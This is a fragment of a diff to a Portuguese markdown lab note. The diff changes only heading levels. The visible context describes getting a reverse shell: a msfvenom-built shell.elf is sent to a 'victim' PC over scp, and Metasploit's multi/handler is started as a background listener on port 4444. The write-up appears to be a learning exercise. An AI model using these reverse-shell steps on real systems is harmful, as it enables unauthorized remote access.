@@ -5,9 +5,9 @@
 em vez de me conectar ao pc da vítima e ser bloqueado pelo firewall, eu fiz o pc da vítima se conectar ao meu, usando um shell.elf
 que fiz com msfvenom, enviei usando o protocolo scp e abri pelo meterpreter com meu msfconsole
 
-### como isso tudo aconteceu?
+## como isso tudo aconteceu?
 
-## no msfconsole
+### no msfconsole
 
 use exploit/multi/handler
 pra usar o handler (listener)
@@ -24,7 +24,7 @@ pois foi a porta que abri no firewall (sudo ufw allow 4444/tcp)
 exploit -j
 exploit pra executar, -j pra rodar em segundo plano e liberar o terminal
 
-## e a criação do shell.elf?
+### e a criação do shell.elf?
 
 no terminal comum
 
